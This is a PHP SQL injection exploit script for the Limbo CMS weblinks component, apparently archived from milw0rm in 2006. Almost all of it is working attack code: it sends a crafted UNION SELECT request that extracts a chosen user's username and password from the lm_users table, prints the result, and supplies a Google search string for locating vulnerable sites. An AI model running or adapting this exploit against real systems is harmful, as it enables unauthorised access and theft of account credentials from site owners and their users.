<pre>
[i] Limbo CMS (option=weblinks) sql injection exploit
[i] coded by [Oo]
<?php

if( (!isset($_GET['host'])) || (!isset($_GET['path'])) || (!isset($_GET['id'])))
{
?>	
[*] Usage: <?echo htmlentities($PHP_SELF)?>?host=[hostname]&path=[limbo_path]&id=[user_id]
[*] Exemple: <?echo htmlentities($PHP_SELF)?>?host=127.0.0.1&path=/limbo&id=1

[g] Google: inurl:"index2.php?option=rss" OR "powered By Limbo CMS"	
<?php
die;
}

$host = $_GET['host'];
$path = $_GET['path'];
$id = $_GET['id'];

$success = 0;

$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
   die("[-] Connection Error!");
} 
else {

   $out = "GET $path/index.php?option=weblinks&Itemid=44&catid=-1%20union%20select%200,1,2,concat(char(0x6c,0x6f,0x67,0x69,0x6e,0x3a),username,char(0x20,0x70,0x61,0x73,0x73,0x77,0x6f,0x72,0x64,0x3a),password),4,5,6,7,8,9,10,11%20from%20lm_users%20where%20id=$id/* HTTP/1.1\r\n";
   $out .= "Host: $host\r\n";
   $out .= "Connection: Close\r\n\r\n";

   fwrite($fp, $out);
   while (!feof($fp)) {
	   $f = fgets($fp, 1024);
       if ( (preg_match("/<div class=\"componentheading\" >/",$f)) && (preg_match("/login/",$f)) )
       {
			echo "$f";
			echo "[+] Enjoy! :><br>";
			$success = 1;
	   }
   }
   fclose($fp);
   
   if (!$success)
	echo "<br>[-] exploit failed :<<br>";
}
?> 
</pre>

# milw0rm.com [2006-05-05]
